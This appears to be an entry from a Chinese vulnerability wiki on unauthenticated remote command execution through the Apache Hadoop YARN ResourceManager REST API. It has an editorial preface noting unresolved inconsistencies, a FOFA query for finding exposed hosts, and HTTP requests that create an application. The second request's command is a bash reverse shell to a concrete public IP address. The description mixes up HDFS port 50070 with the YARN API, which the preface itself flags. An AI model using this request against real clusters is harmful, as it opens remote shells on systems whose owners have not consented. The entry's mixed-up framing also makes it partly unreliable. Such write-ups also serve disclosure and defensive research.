---
source: "wy876 漏洞文库"
title: "Hadoop存在未授权访问导致的RCE"
product: "Apache Hadoop YARN ResourceManager"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
prerequisites: "ResourceManager REST 未设认证，可调度作业；使用申请得到的真实 application-id"
source_status: "unknown"
side_effects: "含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。"
id: "vw-a483bbac95f33a378a707a88"
entity_id: "ve-a483bbac95f33a378a707a88"
schema_version: "1"
---

# Hadoop存在未授权访问导致的RCE

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：ResourceManager REST 未设认证，可调度作业；使用申请得到的真实 application-id
- 证据范围：前言 HDFS 50070 与实际 YARN /ws/v1/cluster 接口混淆，应改标题和边界。

### 本次正文校订

- 按实际内容修正 2 处代码围栏语言标记，保留其中方法与请求内容。

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- HDFS 文件访问不能直接等同 YARN RCE，应分实体
- 版本仅 Hadoop，无部署配置或来源证据
- 第一个响应缺失，第二个 application-id硬编码未说明替换
- Host/Content-Length 空值和真实公网回连地址应改明确占位，避免被误照搬

### 操作风险与资料使用

- 含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

# 一、漏洞描述
Hadoop的核心设计包括分布式文件系统（HDFS）和MapReduce编程模型。HDFS是一个高容错性的分布式文件系统，设计用于在低成本的硬件上运行，提供高吞吐量以访问大规模数据。而MapReduce则是一种处理大规模数据的计算模型，它将应用程序分解成许多小的任务，这些任务可以在分布式集群的任何节点上执行。Hadoop的这些特性使其成为一个适合处理海量数据的平台，广泛应用于大数据存储和处理领域。由于服务器直接在开放了 Hadoop 机器 HDFS 的 50070 web 端口及部分默认服务端口，黑客可以通过命令行操作多个目录下的数据，如进行删除，下载，目录浏览甚至命令执行等操作，产生极大的危害。

# 二、影响版本
Hadoop

# 三、资产测绘
```plain
app="APACHE-hadoop-YARN"
```


# 三、漏洞复现
```http
POST /ws/v1/cluster/apps/new-application HTTP/1.1
Host: 
Content-Type: application/json
Content-Length: 
```


反弹shell

```http
POST /ws/v1/cluster/apps HTTP/1.1
Host: 
Content-Type: application/json
Content-Length: 256

{
  "application-id": "application_1234567890123_0001",
  "application-name": "get-shell",
  "am-container-spec": {
    "commands": {
      "command": "/bin/bash -i >& /dev/tcp/81.71.17.84/9999 0>&1"
    }
  },
  "application-type": "YARN"
}
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/dushc0i493wttgo1>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
